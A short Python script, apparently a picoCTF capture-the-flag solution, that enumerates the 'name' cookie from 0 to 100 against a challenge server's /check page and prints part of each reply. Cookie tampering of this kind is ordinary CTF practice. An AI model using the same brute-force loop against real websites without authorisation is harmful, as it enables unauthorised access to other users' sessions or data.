import requests

url = "http://mercury.picoctf.net:27177/check"

def sendRequest(i):
    cookies = {
        "name": str(i)
    }
    
    response = requests.get(url,cookies=cookies)
    return response.text.split("<b>")[1].split("\n")[0]

def main():
        i = 0
        while i <= 100:
            print(sendRequest(i))
            i+=1

main()
